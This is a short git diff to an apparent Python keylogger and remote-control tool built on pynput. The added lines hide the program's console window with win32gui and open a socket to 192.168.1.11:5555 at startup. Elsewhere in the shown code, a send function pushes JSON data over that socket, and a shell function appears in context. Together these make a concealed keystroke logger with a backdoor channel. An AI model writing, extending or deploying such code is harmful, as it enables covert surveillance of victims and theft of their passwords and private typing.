@@ -5,7 +5,14 @@ import threading
 from pynput.keyboard import Listener
 import os
 import time
+import win32gui, win32con
 
+hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide , win32con.SW_HIDE)
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.11", 5555))
 
 class Keylogger():
     keys = []
@@ -56,8 +63,6 @@ class Keylogger():
 
 
 
-
-
 def send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
@@ -72,8 +77,7 @@ def recieve():
         except ValueError:
             continue
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.11", 5555))
+
 
 def shell():
     global klog
